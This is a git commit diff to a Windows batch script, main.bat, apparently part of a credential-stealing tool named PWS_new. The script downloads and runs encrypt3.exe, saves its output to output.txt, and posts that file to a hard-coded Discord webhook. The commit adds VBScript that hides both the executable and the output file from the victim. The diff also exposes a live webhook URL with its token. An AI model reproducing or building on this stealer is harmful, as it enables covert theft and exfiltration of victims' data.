9c58289404d3f36d7d03c10985dd34f9d4ba839e
Sap196 <93683318+Sap196@users.noreply.github.com>
2024-01-31 21:58:22 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -7,6 +7,12 @@ curl -OL https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt3.exe
 rem Run the Go program and capture its output to a file
 encrypt3.exe > output.txt
 
+rem Save VBScript code to set files as hidden
+echo Set objShell = CreateObject("WScript.Shell") > setHidden.vbs
+echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> setHidden.vbs
+echo objFSO.GetFile("output.txt").Attributes = 2 >> setHidden.vbs
+echo objFSO.GetFile("encrypt3.exe").Attributes = 2 >> setHidden.vbs
+
 rem Construct and execute the cURL command
 set "discord_webhook=https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"
 set "curl_command=curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@output.txt" %discord_webhook%"
